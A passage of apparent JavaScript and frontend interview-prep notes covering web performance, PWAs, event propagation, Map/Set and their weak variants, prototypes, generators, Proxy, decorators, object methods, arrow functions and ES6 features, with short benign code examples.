- Minification: Remove unnecessary characters (spaces, comments, etc.) from CSS, JavaScript, and HTML files to reduce file size.
- Tools: UglifyJS, CSSNano, HTMLMinifier.
- Compression: Use tools like Gzip or Brotli on the server to compress files before sending them to the browser.
- Image Optimization: Use optimized image formats (e.g., WebP), and compress images without significant quality loss.
- Tools: ImageOptim, TinyPNG, Squoosh.

3. Use a Content Delivery Network (CDN)
- A CDN stores copies of your website on servers worldwide, reducing latency and improving loading times for users from different geographic locations.

Example: Cloudflare, Akamai, AWS CloudFront.

4. Optimize JavaScript and CSS
- Defer: A script that will be downloaded in parallel to parsing the page, and executed after the page has finished parsing:
```html
<script src="demo_defer.js" defer></script>
```
Async: A script that will be downloaded in parallel to parsing the page, and executed as soon as it is available:
```html
<script src="demo_async.js" async></script>
```

5. Improve Caching
- Browser Caching: Leverage browser caching by specifying caching rules in the HTTP headers. This reduces the number of HTTP requests and improves load times for returning users.
- Use Cache-Control and Expires headers to tell browsers how long they can store files before fetching a new copy.
- Service Workers: Implement service workers to cache assets and enable offline functionality for web apps.

6. Optimize Backend Performance
- Database Optimization: Use efficient database queries, proper indexing, and avoid N+1 query problems.
- Use caching solutions like Redis or Memcached for frequently requested data.
- API Optimization: Reduce payload sizes by only sending necessary data, compress API responses, and paginate large datasets.
- Asynchronous Processing: Use background processing for tasks that are not immediately required (e.g., sending emails, long-running tasks).
- Load Balancing: Distribute traffic evenly across servers to handle high loads.

7. Optimize Fonts
- Use modern font formats like WOFF2 to reduce font file sizes.
- Font Display: Use the font-display: swap; property to prevent font-loading delays from affecting user experience.
-Minimize the number of web fonts and use system fonts where possible.

8. Analyze Performance
- Use tools like Google Lighthouse, PageSpeed Insights, and GTmetrix to identify performance bottlenecks.
- Web Vitals: Focus on Core Web Vitals (Largest Contentful Paint, First Input Delay, Cumulative Layout Shift) to improve user experience and SEO.

Example of a Basic Optimization Plan:
- Minify and compress your CSS, JavaScript, and images.
- Use lazy loading for images and asynchronous loading for JavaScript.
- Implement a CDN to serve static assets globally.
- Leverage browser caching and set up service workers for offline functionality.
- Analyze performance with Google Lighthouse and make continuous improvements.



**Progressive Web App (PWA):**
- A Progressive Web App (PWA) is a web application that uses modern web technologies to deliver a user experience similar to a native mobile app.
- PWAs combine the best features of websites and mobile apps, providing a fast, reliable, and engaging experience, while being accessible through a browser without needing to be downloaded from an app store.

**Key Features of a Progressive Web App:**
- Progressive: Works for every user, regardless of their browser, as it is built with progressive enhancement in mind. This means that it -works even on older browsers but provides an enhanced experience on modern ones.
- Responsive: Adapts to different screen sizes and devices, whether on a desktop, tablet, or mobile phone.
- Offline Capabilities: With the help of service workers, PWAs can work offline or with poor network connections by caching key assets and content.
- App-like Experience: PWAs mimic the look and feel of native apps, providing app-style interactions and navigation.
- Fast: PWAs load quickly, even on slow networks, thanks to caching strategies and optimized resource management.
- Push Notifications: PWAs can send real-time push notifications, just like native apps, keeping users engaged even when they are not using the app.
- Installable: Users can add PWAs to their home screen or desktop without needing to go through an app store. The app icon appears on the home screen like a regular mobile app.
- Secure: PWAs are served over HTTPS to ensure a secure connection, protecting user data and ensuring the app is tamper-resistant.
- Linkable: Since PWAs are websites at their core, they can be easily shared via a URL, just like any other website.


**How PWAs Work?**
- Service Workers: These are background scripts that enable offline functionality, push notifications, and resource caching. They help the PWA run smoothly even when the user is offline by caching key resources locally.
- Service workers can intercept network requests and serve cached resources when the network is unavailable, making the app faster and more reliable.

**Benefits of Progressive Web Apps:**
- Cross-Platform Compatibility: A single codebase works across different devices (desktop, mobile, tablet) and platforms (iOS, Android, Windows, etc.), reducing development effort.
- Improved Performance: PWAs load faster than traditional web apps, thanks to caching mechanisms and efficient resource management.
- Engagement: Features like push notifications and offline access help keep users engaged, even when they are not actively using the app.
- No App Store Dependency: Users can install PWAs directly from the browser, bypassing app store submission processes, and users don’t have to go through the hassle of downloading updates.
- Lower Development Costs: Instead of maintaining separate apps for Android, iOS, and the web, developers can focus on building a single PWA.

**Event Bubbling:**
- In event bubbling, the event starts from the target element (the element that triggered the event) and propagates upward to its ancestors in the DOM hierarchy.
- How it works: The event first happens on the most specific element (the one that directly triggered the event) and then "bubbles" up to the less specific elements (its parent, grandparent, etc.), all the way to the root (<html>).
- Example: If you click on a button inside a <div>, the click event will be handled by the button first, then the <div>, and then continue bubbling up to its ancestor elements like <body> and <html>.

```html
<div id="parent">
    <button id="child">Click me</button>
</div>

<script>
    document.getElementById("parent").addEventListener("click", function() {
        console.log("Parent clicked");
    });

    document.getElementById("child").addEventListener("click", function() {
        console.log("Child clicked");
    });
</script>
```

- In above example, if you click on the button, both the button's (child) and div's (parent) event listeners will fire, since the event bubbles up the DOM.


**Event Capturing:**
- In event capturing (also known as the "trickling" phase), the event starts from the root of the DOM and propagates downward to the target element.
- How it works: The event first travels from the outermost element (<html>, <body>, etc.) down through the ancestors of the target element, until it reaches the target element itself.
- Example: If you click on a button inside a <div>, the event first travels from the <html> element down to the <div>, and finally to the button.
- To explicitly use event capturing, you need to set the capture parameter in addEventListener() to true.

```html
<div id="parent">
    <button id="child">Click me</button>
</div>

<script>
    document.getElementById("parent").addEventListener("click", function() {
        console.log("Parent clicked (capturing)");
    }, true); // Enable capturing phase

    document.getElementById("child").addEventListener("click", function() {
        console.log("Child clicked");
    });
</script>
```
- In above example, if you click the button, the "Parent clicked (capturing)" message will be logged first (because capturing happens first), and then "Child clicked" will be logged.


**Event Propagation Phases**
- There are three phases in the event propagation process:
1. Capturing phase: The event propagates from the outermost ancestor to the target element.
2. Target phase: The event is handled at the target element.
3. Bubbling phase: The event propagates back up from the target element to its ancestors.

- By default, event listeners in JavaScript listen during the bubbling phase unless you explicitly set them to listen during the capturing phase.

- If you want to stop an event from propagating further (either bubbling or capturing), you can use the event.stopPropagation() method.

```javascript
document.getElementById("child").addEventListener("click", function(event) {
    event.stopPropagation(); // Stops the event from bubbling up
    console.log("Child clicked and propagation stopped");
});

```
- In above example, after clicking the button, the event won't propagate to the parent <div>.



**Event Delegation:**
- Event delegation in JavaScript is a technique where you attach a single event listener to a parent element to manage events on its child elements, even those that may be dynamically added later.
- This approach is more efficient than adding separate event listeners to each child element individually, especially when dealing with a large number of child elements or dynamically generated elements.


**Map and Set Data Structures:**
- In JavaScript, Map and Set are two built-in data structures that provide efficient ways to store and manage collections of data.

**Map:**
- A Map is a collection of key-value pairs where keys can be of any type, including objects, arrays, and functions (not limited to strings or numbers).
- It's similar to an object but provides additional features, like maintaining the order of entries.

Keys can be of any type.
- Iteration happens in insertion order.
- Easily get the size with map.size.
- Methods: set(), get(), delete(), has(), clear().

Ex:
```javascript
// Creating a new Map
let myMap = new Map();

// Setting key-value pairs
myMap.set('name', 'Alice');
myMap.set(42, 'The Answer');
myMap.set({id: 1}, 'User1');

// Accessing values
console.log(myMap.get('name'));  // 'Alice'
console.log(myMap.get(42));      // 'The Answer'

// Checking for existence
console.log(myMap.has('name'));  // true

// Deleting an entry
myMap.delete('name');

// Getting size of the Map
console.log(myMap.size);         // 2

// Iterating over the Map
for (let [key, value] of myMap) {
    console.log(key, value);
}

// Clearing the Map
myMap.clear();
```

**Set:**
- A Set is a collection of unique values. It does not allow duplicates, and values can be of any type.

**Key Features:**
- Stores only unique values.
- Iteration happens in insertion order.
- Easily get the size with set.size.
- Methods: add(), delete(), has(), clear().

Ex:
```javascript
// Creating a new Set
let mySet = new Set();

// Adding values to the Set
mySet.add(1);
mySet.add(5);
mySet.add('hello');
mySet.add(1);  // Duplicate, will not be added

// Checking for existence
console.log(mySet.has(5));       // true

// Getting size of the Set
console.log(mySet.size);         // 3

// Deleting a value
mySet.delete(1);

// Iterating over the Set
for (let value of mySet) {
    console.log(value);
}

// Clearing the Set
mySet.clear();
```

**WeakMap and WeakSet:**

- In addition to Map and Set, JavaScript also provides WeakMap and WeakSet.
- These are similar to Map and Set but have certain important differences related to memory management, specifically in how they interact with the garbage collector.

**WeakMap:**
- A WeakMap is a collection of key-value pairs where the keys must be objects (not primitive values), and the references to these keys are "weak."
- This means if there are no other references to the object key, it can be garbage-collected.

**Key Features:**
- Keys must be objects (not strings, numbers, or other primitives).
- Key-value pairs are held weakly, meaning if an object is no longer referenced elsewhere, it can be garbage-collected.
- You cannot iterate over a WeakMap (no forEach, no keys(), no values(), etc.).
- Useful for cases where you want to associate metadata with objects without preventing them from being garbage-collected.

**Methods:**
- set(key, value): Adds a key-value pair.
- get(key): Retrieves the value associated with the key.
- delete(key): Removes the key-value pair.
- has(key): Checks if a key exists.

Ex:
```javascript
let weakMap = new WeakMap();

let obj1 = {};
let obj2 = {};

weakMap.set(obj1, 'Object 1');
weakMap.set(obj2, 'Object 2');

console.log(weakMap.get(obj1));  // 'Object 1'

// Deleting reference to obj1
obj1 = null;

// The object is garbage-collected, weakMap will no longer hold that key
// But we can't directly check its size or iterate through it
console.log(weakMap.has(obj1));  // false
```

**When to use WeakMap?**
- Storing data related to an object without creating strong references, which could prevent garbage collection.
- For example, caching values based on objects that may be temporary.

**WeakSet:**
- A WeakSet is a collection of objects, similar to a Set, but where the objects are held weakly.
- Like WeakMap, the references are weak, meaning that if an object stored in a WeakSet is no longer referenced anywhere else, it can be garbage-collected.

**Key Features:**
- Only objects can be added to a WeakSet (no primitives).
- Objects are held weakly, so if an object is no longer referenced, it will be garbage-collected.
- You cannot iterate over a WeakSet or check its size (WeakSet is not enumerable).
- Primarily useful for tracking objects without preventing their garbage collection.

**Methods:**
- add(value): Adds an object to the WeakSet.
- delete(value): Removes an object from the WeakSet.
- has(value): Checks if an object is in the WeakSet.

Ex:
```javascript
let weakSet = new WeakSet();

let obj1 = {name: 'Object 1'};
let obj2 = {name: 'Object 2'};

weakSet.add(obj1);
weakSet.add(obj2);

console.log(weakSet.has(obj1));  // true

// Deleting reference to obj1
obj1 = null;

// obj1 can be garbage-collected and will no longer be part of the WeakSet
console.log(weakSet.has(obj1));  // false
```

**When to use WeakSet?**
- When you need a set of objects, but don't want to prevent them from being garbage-collected if they are no longer in use.
- For example, tracking objects in a DOM that may be removed.

**Key Differences between WeakMap/WeakSet and Map/Set:**
- Garbage Collection: WeakMap and WeakSet allow for garbage collection of their objects if there are no other references, unlike Map and Set.
- Non-Enumerable: You can't iterate over or check the size of WeakMap or WeakSet. They are meant for use cases where the existence of an object matters more than its enumeration.
- Key/Value Types: WeakMap only allows objects as keys, and WeakSet only allows objects as values.

**Prototype:**
- In JavaScript, the prototype is a fundamental concept that enables inheritance and sharing of properties and methods among objects.
Here’s a breakdown of how it works:
- Prototypes are essential in JavaScript for implementing inheritance and creating shared methods.


1. Prototype Object:
- Every JavaScript function has a prototype property.
- When a function is used as a constructor (with the new keyword), the object created inherits from that function’s prototype.

2. Inheritance:
- Objects can inherit properties and methods from other objects via the prototype chain.
- This allows for code reuse and a more organized structure.

3. Prototype Chain:
- When you access a property or method of an object, JavaScript first checks if the property exists on the object itself.
- If not, it looks up the prototype chain until it finds the property or reaches the end of the chain (null).

Ex:
```javascript
function Person(name) {
    this.name = name;
}

Person.prototype.greet = function() {
    console.log(`Hello, my name is ${this.name}`);
};

const john = new Person('John');
john.greet(); // Output: Hello, my name is John

console.log(john.__proto__ === Person.prototype); // true
```

In this example:
- Person is a constructor function.
- greet is a method added to Person.prototype.
- When we create a new instance john, it can access the greet method through the prototype chain.


**Generators:**
- In JavaScript, generators are special types of functions that can be paused and resumed, allowing for more flexible iteration.
- They are defined using the function* syntax, and they use the yield keyword to pause execution.
Here's a breakdown of how generators work:

1. Generator Function: A generator function is declared with the function* syntax and can return an iterator.
```javascript
function* myGenerator() {
  yield 1;
  yield 2;
  yield 3;
}
```

2. yield Keyword: The yield keyword is used to pause the execution of the generator function and return a value. When yield is called, it pauses the function at that point until .next() is invoked again.

3. Iterator Object: When you call a generator function, it doesn't execute immediately. Instead, it returns an iterator object that you can use to control execution.
```javascript
const gen = myGenerator();
console.log(gen.next()); // { value: 1, done: false }
console.log(gen.next()); // { value: 2, done: false }
console.log(gen.next()); // { value: 3, done: false }
console.log(gen.next()); // { value: undefined, done: true }
```
- Each call to .next() moves to the next yield and returns an object with two properties:
- value: the value returned by the yield statement.
- done: a boolean that is false until the generator is done, at which point it becomes true.

4. return in Generators: If the generator function finishes or uses the return statement, it will mark the iterator as done.
```javascript
function* generatorWithReturn() {
  yield 'Hello';
  return 'World';
}

const gen = generatorWithReturn();
console.log(gen.next()); // { value: 'Hello', done: false }
console.log(gen.next()); // { value: 'World', done: true }
```

5. Generator Functions for Infinite Sequences: Generators are perfect for representing infinite sequences because they produce values lazily, on-demand.
```javascript
function* infiniteNumbers() {
  let num = 1;
  while (true) {
    yield num++;
  }
}

const gen = infiniteNumbers();
console.log(gen.next().value); // 1
console.log(gen.next().value); // 2
console.log(gen.next().value); // 3
```

**Use Cases:**
- Lazy evaluation: Generate values as needed, useful for large or infinite data sets.
- Iterating through asynchronous data: Combine with async functions to handle asynchronous operations in a more readable way (using async generators).
- State machine implementation: Generators can easily manage state transitions.

**What will happen once a website is opened in the browser?**
- When you open a website in a browser, several steps take place to load and display the webpage:

1. DNS Resolution
- The browser first checks the website's domain (e.g., example.com). It queries the Domain Name System (DNS) to get the corresponding IP address of the server hosting the website.
2. Establishing a Connection (TCP/IP and SSL/TLS)
- The browser uses the retrieved IP address to connect to the web server using the TCP/IP protocol.
- If the site uses HTTPS (which most modern sites do), an SSL/TLS handshake happens to establish a secure connection.
3. Sending an HTTP Request
- The browser sends an HTTP request (or HTTPS for secure sites) to the server, typically requesting a specific page (e.g., index.html).
4. Server Response
- The server processes the request and responds with an HTTP response, usually containing the HTML, CSS, JavaScript, and other resources (like images or fonts) needed to display the page.
5. Rendering the Web Page
- HTML Parsing: The browser parses the HTML document and builds the Document Object Model (DOM), a tree structure representing the webpage's content and structure.
- CSS Parsing: If there are linked or embedded CSS files, the browser will load them and apply styles to the elements in the DOM, building the CSSOM (CSS Object Model).
- JavaScript Execution: The browser then parses and executes any JavaScript, potentially modifying the DOM or CSSOM (for dynamic elements like interactive buttons, animations, etc.).
- Rendering Tree: From the DOM and CSSOM, the browser creates a rendering tree to determine the layout and positioning of elements on the page.
6. Layout and Paint
- The browser calculates the positions and sizes of all elements (layout) and then paints them pixel by pixel on the screen.
7. Handling Additional Resources
- The initial page might reference additional resources like images, fonts, and external scripts. The browser sends separate HTTP requests for each of these resources and processes them as they are loaded.
8. Repaints and Reflows
- As JavaScript runs or if dynamic changes (like resizing a window or clicking buttons) occur, the browser might need to update the layout (reflow) or redraw parts of the screen (repaint).
9. Interaction with User
- The page is now fully interactive. Users can click on buttons, submit forms, and interact with the site based on its design and functionality.

- This entire process happens very quickly, usually within milliseconds or seconds, depending on the size and complexity of the website.


**MutationObserver:**
- The MutationObserver is a built-in JavaScript API that allows you to watch for changes (mutations) in the DOM (Document Object Model).
- It is used to track modifications to the structure or attributes of DOM elements, such as when new nodes are added, removed, or when attributes are changed.

- Dynamic Content: Detect when elements are added or removed dynamically in the DOM.
- Attribute Changes: Observe changes to attributes on an element.
- Content Changes: Watch for changes in the text or child elements inside an element.
- Alternative to DOM events: MutationObserver can be used when events like input, change, or DOMSubtreeModified don’t provide the needed granularity.

Ex:
```javascript
// 1. Define a callback function that will run when mutations are observed
const callback = (mutationsList, observer) => {
  for (let mutation of mutationsList) {
    if (mutation.type === 'childList') {
      console.log('A child node has been added or removed.');
    } else if (mutation.type === 'attributes') {
      console.log(`The ${mutation.attributeName} attribute was modified.`);
    }
  }
};

// 2. Create a MutationObserver instance and pass in the callback function
const observer = new MutationObserver(callback);

// 3. Select the target node to observe (for example, a div element)
const targetNode = document.getElementById('myElement');

// 4. Start observing the target node with specific mutation options
observer.observe(targetNode, {
  attributes: true,    // Watch for changes in attributes
  childList: true,     // Watch for additions or removals of child nodes
  subtree: true        // Watch the entire subtree under the target node
});

// 5. Optionally, disconnect the observer when done
// observer.disconnect();
```

**Proxy class:**
- The Proxy class in JavaScript is a feature that allows you to create an object that intercepts and customizes the behavior of other objects, like when you get or set a property, call a function, etc.
- It is used to customise the behavior of the objects whicle getting or setting a property or while calling a function etc

- Imagine you have an object, and you want to watch, modify, or control how people interact with that object.
- A Proxy acts like a middleman. It can intercept actions (like getting or setting properties) and allow you to add custom behavior.

Ex:
Suppose I want to log something when someone is trying to access the name from the person object.
```javascript
const person = {
  name: "John",
  age: 30
};

// Proxy handler with traps
const handler = {
  get: function(target, property) {
    console.log(`Getting the value of ${property}`);
    return target[property];
  },
  set: function(target, property, value) {
    console.log(`Setting the value of ${property} to ${value}`);
    target[property] = value;
  }
};

// Creating a proxy
const proxyPerson = new Proxy(person, handler);

// Using the proxy
console.log(proxyPerson.name); // Logs: "Getting the value of name" then "John"
proxyPerson.age = 31;          // Logs: "Setting the value of age to 31"
```
- get and set are inbuilt trap methods in the handler object for a Proxy.
- These trap methods allow you to define custom behavior when certain operations are performed on the target object.

- get: This trap is triggered whenever you access a property on the object. It allows you to control or modify what happens when a property is read.
- set: This trap is triggered whenever a property is modified or assigned a new value. You can use this to validate, log, or even prevent setting certain properties.
- apply: For intercepting function calls.
- construct: For intercepting new object creation.
- deleteProperty: For intercepting delete operations.
- has: For intercepting the in operator.


**Pure Function:**
- A pure function in JavaScript is a function that, given the same inputs, always returns the same output and has no side effects.
- This means that pure functions do not depend on or modify any state outside their scope, and they don't produce any observable changes, like modifying global variables, I/O operations, or DOM manipulations.

**Characteristics of Pure Functions**
1. **Same Input, Same Output:**
- For a given set of inputs, a pure function will always return the same result.
- This makes pure functions predictable and easy to reason about.

**Examples:**
```javascript
function add(a, b) {
    return a + b;
}

console.log(add(2, 3)); // Always 5
console.log(add(2, 3)); // Always 5
```

```javascript
function multiply(x, y) {
    return x * y;
}

```

**2. No Side Effects:**
- A pure function does not modify any external state or cause side effects such as modifying global variables, changing the state of objects, making API calls, or modifying the DOM.


**Example of an impure function (because it causes a side effect by modifying the count variable):**
```javascript
let count = 0;

function incrementCount() {
    count += 1; // Impure because it modifies external state
}

```

**Benefits of Pure Functions:**
- Predictability: Since pure functions always return the same output for the same input, they are easier to test and debug.
- Referential Transparency: A pure function call can be replaced with its return value without changing the behavior of the program.
- Composability: Pure functions can be easily combined and reused, making functional programming patterns possible.
- Immutability: Pure functions don’t mutate variables, leading to safer and more reliable code.


**Example of a Pure Function:**
```javascript
function square(n) {
    return n * n;
}

console.log(square(4)); // 16
console.log(square(4)); // 16 (same result every time with the same input)
```

**Example of an Impure Function:**
```javascript
let base = 10;

function impureAdd(a, b) {
    return a + b + base; // Uses an external variable, making it impure
}

console.log(impureAdd(2, 3)); // The result depends on the external 'base' variable
```

- In above example, impureAdd is an impure function because it relies on the external base variable. If base changes, the result of the function will also change, making the function unpredictable.

**Summary:**
**A pure function:**
- Always returns the same result for the same input.
- Has no side effects (does not modify external variables, perform I/O operations, etc.).
- In functional programming, pure functions are highly valued because they promote cleaner, more predictable code.


**Decorators:**
- In JavaScript, decorators are a special syntax used to modify or enhance classes and their members (methods, properties, etc.).
- Decorators provide a clean way to apply reusable functionality to classes or class members without cluttering their core logic.
- They are still a stage 3 proposal in ECMAScript, meaning they are not officially part of the standard yet, but can be used with transpilers like Babel or TypeScript.

**How They Work:**
- A decorator is simply a function that gets applied to a class or a class member. It takes the target (the thing it decorates) and can modify or replace it.

**Syntax:**
- Decorators are denoted by the @ symbol followed by the decorator function name.

```javascript
@decorator
class MyClass { ... }

@decorator
method() { ... }
```


**Example of Method Decorator:**

```javascript
function logExecutionTime(target, key, descriptor) {
    const originalMethod = descriptor.value;
    
    descriptor.value = function(...args) {
        console.log(`Method ${key} execution started`);
        const result = originalMethod.apply(this, args);
        console.log(`Method ${key} execution finished`);
        return result;
    };
    
    return descriptor;
}

class Example {
    @logExecutionTime
    compute() {
        // Some logic
        return "Result";
    }
}

const obj = new Example();
obj.compute();
```

**In this example:**
- logExecutionTime is a decorator applied to the compute method.
- It wraps the method in a logging functionality, without modifying the method’s original logic.


```javascript
function sealed(constructor) {
    Object.seal(constructor);
    Object.seal(constructor.prototype);
}

@sealed
class SealedClass {
    constructor(name) {
        this.name = name;
    }
}

const instance = new SealedClass('Test');
// Now `SealedClass` and its prototype are sealed, preventing new properties from being added.
```

**In this example:**
- The sealed decorator prevents new properties from being added to the class and its prototype.


**Arguments Passed to Decorators:**
1. Class Decorator:
	- constructor: The constructor function of the class.
2. Method Decorator:
	- target: The prototype of the class if it's an instance method, or the constructor if it's a static method.
	- key: The name of the method.
	- descriptor: The property descriptor of the method, which can be used to modify the method (e.g., change its behavior).

**Note:**
- Decorators are composable, meaning you can apply multiple decorators to the same class or method, and they are executed from top to bottom.
- They can be used to modify properties as well, though the pattern is more common for methods and classes.



**Object vs Map:**

| Feature                  | `Object`                                     | `Map`                                      |
|--------------------------|----------------------------------------------|--------------------------------------------|
| **Key Types**            | Only strings (or symbols); other types are coerced to strings | Any data type (strings, numbers, objects, functions, etc.) |
| **Order of Insertion**   | Mostly unordered (insertion order somewhat maintained for strings after integer-like keys) | Maintains strict insertion order |
| **Size Property**        | No direct property, must be calculated manually | `.size` property provides the count of entries |
| **Iteration**            | Not directly iterable; needs `Object.keys()`, `Object.values()`, or `Object.entries()` | Directly iterable with `for...of` or `.forEach()` |
| **Performance**          | Optimized for static key-value pairs and simple lookups | Optimized for frequent additions/removals and faster iteration over large data sets |
| **Methods for Management** | Basic methods for adding, accessing, and deleting; needs additional methods for iteration (`Object.keys()`, etc.) | Built-in methods like `.get()`, `.set()`, `.has()`, `.delete()`, and `.forEach()` |
| **Use Cases**            | Best for simple key-value storage with strings or fixed structures | Ideal for complex data handling where key types vary or insertion order matters |


**Example:**

**Object**  
```javascript
const obj = {};
obj['stringKey'] = 'value';
obj[42] = 'number as a string key'; // 42 coerced to "42"
console.log(obj); // { stringKey: 'value', '42': 'number as a string key' }
```

**Map**  
```javascript
const map = new Map();
map.set('stringKey', 'value');
map.set(42, 'number key'); // 42 remains a number
console.log(map.get(42)); // 'number key'
console.log(map.size);    // 2
```


**Spread operator vs Object.assign**
- The spread operator (...) and Object.assign() are both used to copy or merge objects in JavaScript, but they have differences in syntax, behavior, and usage. Here’s a comparison to understand when to use each.

1. Syntax
- Spread Operator: Uses ... syntax to create a shallow copy or merge objects.
- Object.assign(): Uses a function call with the target object as the first argument, followed by the source objects.
```javascript
const obj1 = { a: 1 };
const obj2 = { b: 2 };

// Using Spread
const spreadCopy = { ...obj1, ...obj2 };

// Using Object.assign()
const assignCopy = Object.assign({}, obj1, obj2);
```

2. Shallow Copy
- Both ... and Object.assign() create shallow copies, meaning only the top-level properties are copied. Nested objects are not deeply cloned.
```javascript
const obj = { a: 1, nested: { b: 2 } };
const spreadCopy = { ...obj };
const assignCopy = Object.assign({}, obj);

obj.nested.b = 3;
console.log(spreadCopy.nested.b); // 3, affected by changes in `obj`
console.log(assignCopy.nested.b); // 3, affected by changes in `obj`
```

3. Merging Objects
- Spread Operator: Simple and concise for merging objects.
- Object.assign(): Achieves the same result but with different syntax.
```javascript
const obj1 = { a: 1 };
const obj2 = { b: 2 };
const merged = { ...obj1, ...obj2 }; // Spread
const mergedAssign = Object.assign({}, obj1, obj2); // Object.assign
```

4. Setting the Target
- Object.assign(): You can specify any object as the target (including an existing object) for merging, which will modify the target.
- Spread Operator: Always creates a new object (does not modify existing objects).
```javascript
const target = { a: 1 };
const source = { b: 2 };

Object.assign(target, source); // Modifies `target`
console.log(target); // { a: 1, b: 2 }

const spreadMerged = { ...target, ...source }; // Creates a new object
console.log(spreadMerged); // { a: 1, b: 2 }
```

5. Cloning Object with Inherited Properties
- Object.assign(): Only copies enumerable and own properties.
- Spread Operator: Same behavior, but is syntactically cleaner for creating copies and shallow merging.

6. Use Cases
- Use spread operator when you want to create a new object (especially if you need immutability).
- Use Object.assign() if you need to merge objects into an existing object or if you prefer a more explicit method call.

| Feature                        | Spread Operator (`...`)                         | `Object.assign()`                             |
|--------------------------------|-------------------------------------------------|----------------------------------------------|
| **Syntax**                     | `{ ...source }`                                 | `Object.assign({}, source)`                  |
| **Shallow Copy**               | Yes                                             | Yes                                          |
| **Merging Objects**            | Simple, concise syntax                          | Requires function call                       |
| **Target Mutability**          | Always creates a new object                     | Can modify the target object directly        |
| **Inherited Properties**       | Does not copy inherited properties              | Does not copy inherited properties           |
| **Use Case**                   | Cloning, shallow merging, and immutability      | Merging with optional target mutability      |


**object.freeze vs object.seal:**
- In JavaScript, Object.freeze and Object.seal are methods used to restrict modifications to objects, but they differ in how much they lock down the object.

**Object.freeze()**
- Purpose: Makes an object completely immutable.
- Effect:
  - Properties cannot be added, deleted, or changed.
  - Values of properties cannot be modified, and existing properties cannot be reconfigured.
- Use Case: Use Object.freeze() when you want a fully immutable object.

**Example:**
```javascript
const obj = { name: "John" };
Object.freeze(obj);

obj.name = "Jane"; // No effect; 'name' remains "John"
obj.age = 30; // No effect; no 'age' property added
delete obj.name; // No effect; 'name' property not deleted

```


**Object.seal():**
- Purpose: Prevents adding or removing properties but allows modifying existing properties.
- Effect:
  - Properties cannot be added or deleted.
  - Existing property values can be changed, but properties cannot be reconfigured (e.g., changing writable or enumerable).
- Use Case: Use Object.seal() when you want to prevent structural changes but still allow modifications to values.

**Example:**
```javascript
const obj = { name: "John" };
Object.seal(obj);

obj.name = "Jane"; // Allowed; 'name' becomes "Jane"
obj.age = 30; // No effect; no 'age' property added
delete obj.name; // No effect; 'name' property not deleted

```


**In short:**
- Freeze: Complete immutability.
- Seal: Allows value modification but no structural changes.


| Method          | Add Properties | Delete Properties | Modify Values | Reconfigure Properties |
|-----------------|----------------|-------------------|---------------|------------------------|
| `Object.freeze` | No             | No               | No            | No                     |
| `Object.seal`   | No             | No               | Yes           | No                     |



**Normal function vs Arrow function**
- In JavaScript, normal functions (also known as "function declarations" or "function expressions") and arrow functions (introduced in ES6) have different syntax and behaviors, especially regarding how they handle this and certain other properties.
1. ```this``` Binding

**Normal Function:**
- Creates its own this context, which depends on how it’s called.
- If you call a function as a method (e.g., obj.method()), this will refer to the object obj.
- Otherwise, this defaults to window in non-strict mode or undefined in strict mode.
**Example:**
```javascript
const obj = {
  value: 10,
  getValue: function() {
    return this.value; // 'this' refers to obj
  }
};
```

**Arrow Function:**
- Does not create its own this context.
- Instead, it lexically binds this, meaning it inherits this from the parent scope.
- This is useful in cases where you want this to refer to the outer context.
**Example:**
```javascript
const obj = {
  value: 10,
  getValue: () => this.value  // 'this' refers to the outer scope (not obj)
};
```

2. arguments Object  

**Normal Function:**
- Has access to the arguments object, which contains all the arguments passed to the function.
```javascript
function logArgs() {
  console.log(arguments);
}
```
**Arrow Function:**
- Does not have its own arguments object.
- You can use rest parameters (...args) to access arguments instead.
```javascript
const logArgs = (...args) => console.log(args);
```

3. Constructor Behavior  

**Normal Function:**
- Can be used as constructors with the new keyword to create instances.
```javascript
function Person(name) {
  this.name = name;
}
const person = new Person("Alice");
```
**Arrow Function:**
- Cannot be used as constructors and will throw an error if used with new.
```javascript
const Person = (name) => {
  this.name = name;
};
const person = new Person("Alice");  // Error
```

4. Implicit Return  

**Normal Function:**
- Requires an explicit return statement for returning a value.
**Arrow Function:**
- If the function body has only a single expression, you can omit the return keyword, and the expression is returned implicitly.
```javascript
const add = (a, b) => a + b; // Implicit return
```

| Feature               | Normal Function               | Arrow Function               |
|-----------------------|-------------------------------|------------------------------|
| Syntax                | `function () { }`             | `() => { }`                  |
| `this` Binding        | Dynamic                       | Lexical (inherits from scope)|
| `arguments`           | Available                     | Not available                |
| Constructor           | Can be used as a constructor  | Cannot be used as a constructor |
| Implicit Return       | No                            | Yes (for single expressions) |



**Are arrow functions hoisted?**
- No, arrow functions in JavaScript cannot be hoisted.
- In JavaScript, function declarations (created using the function keyword) are hoisted, meaning they’re moved to the top of their scope during compilation.
- This allows them to be called before they’re defined in the code.
- However, arrow functions (as well as function expressions assigned to variables) are not hoisted because they’re created as variable assignments.
- Variables declared with let, const, or var are hoisted in terms of their declarations, but not their initializations.
- This means the variable is technically "known" by the compiler but has no value until the line of code assigning it is actually executed.


**ES6 Features:**

ES6 (ECMAScript 2015) introduced many powerful new features to JavaScript, making the language more expressive and efficient. Here are some of the most notable features:

### 1. **Arrow Functions**
   - Concise syntax for writing functions, especially useful for inline functions and callbacks.
   - Arrow functions also don’t have their own `this` context, making them especially handy for certain kinds of callbacks.
   ```javascript
   const add = (a, b) => a + b;
   ```

### 2. **Let and Const**
   - `let` and `const` are block-scoped declarations that prevent issues with variable hoisting and re-assignment:
     - `let` is used for variables that may change value.
     - `const` is used for constants that won’t change.
   ```javascript
   let x = 10;
   const y = 20;
   ```

### 3. **Template Literals**
   - Use backticks (`` ` ``) for strings, allowing embedded expressions with `${}` and multiline strings:
   ```javascript
   const name = 'John';
   const greeting = `Hello, ${name}!`;
   ```

### 4. **Destructuring Assignment**
   - Extract values from arrays or properties from objects into distinct variables.
   ```javascript
   // Array destructuring
   const [a, b] = [1, 2];
   
   // Object destructuring
   const { name, age } = { name: 'Alice', age: 25 };
   ```

### 5. **Default Parameters**
   - Specify default values for function parameters.
   ```javascript
   function greet(name = 'Guest') {
     return `Hello, ${name}`;
   }
   ```

### 6. **Rest and Spread Operators (`...`)**
   - **Rest** gathers remaining elements into an array:
     ```javascript
     function sum(...numbers) {
       return numbers.reduce((acc, n) => acc + n, 0);
     }
     ```
   - **Spread** expands arrays or objects:
     ```javascript
     const arr1 = [1, 2, 3];
     const arr2 = [...arr1, 4, 5];
     ```

### 7. **Enhanced Object Literals**
   - Allows for concise property definitions, method definitions, and computed property names in objects:
   ```javascript
   const name = 'Alice';
   const person = {
     name,                // Shorthand for name: name
     greet() {            // Method shorthand
       console.log(`Hi, ${this.name}!`);
     },
     ['prop_' + 42]: 'Hello'  // Computed property
   };
   ```

